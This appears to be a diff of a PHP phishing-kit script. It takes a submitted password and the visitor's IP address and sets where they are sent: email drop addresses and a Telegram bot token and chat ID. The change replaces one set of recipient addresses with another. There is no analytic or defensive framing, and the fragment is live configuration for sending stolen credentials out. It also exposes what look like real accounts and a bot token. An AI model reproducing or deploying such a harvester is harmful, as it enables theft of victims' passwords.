@@ -2,7 +2,7 @@
   
     $data = trim($_POST['pass']);
     $ipaddress = $_SERVER['REMOTE_ADDR'];
-    $to = "Mickmullfer@gmail.com,r3sultb0x@rambler.ru";
+    $to = "zhu.zhung@yandex.com,successfulbolo@gmail.com";
     $token = "8452431501:AAEulCr9zDSqWKVvTcozPYpQpeyDy_hECQk";
     $chatid = "1357995456";
 
